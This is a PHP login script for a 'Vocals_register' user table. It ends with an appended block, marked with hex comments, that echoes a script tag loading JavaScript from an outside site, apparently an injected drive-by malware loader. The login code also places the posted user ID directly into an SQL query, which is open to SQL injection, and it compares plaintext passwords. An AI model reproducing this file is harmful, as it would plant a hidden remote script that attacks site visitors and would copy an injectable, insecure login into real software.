<?
	session_start();
	include('lib.php');
	$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
	
	$user_id=$_POST['user_id'];
	$user_pw=$_POST['user_pw']; //for registration
	
	if($user_id!="" && $user_pw!=""){
		$sql="select * from Vocals_register where user_id=trim('$user_id')";
		$result=mysql_query($sql);	
		$data=mysql_fetch_array($result);

		if($user_id==$data[user_id]){
			if($user_pw==$data[user_pw]){
				$_SESSION[user_name]=$data[user_name];
				$_SESSION[user_id]=$data[user_id];
				$_SESSION[user_no]=$data[user_no];
				echo "success".$_SESSION[user_name];
			}else{
				echo "fail";
			}
		}else{
			echo "fail2";
		}
	}else{
		echo "fail3";
	}
?>
<?php
#69d16e#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155821\"></script>";
echo $vt;
}
#/69d16e#
?>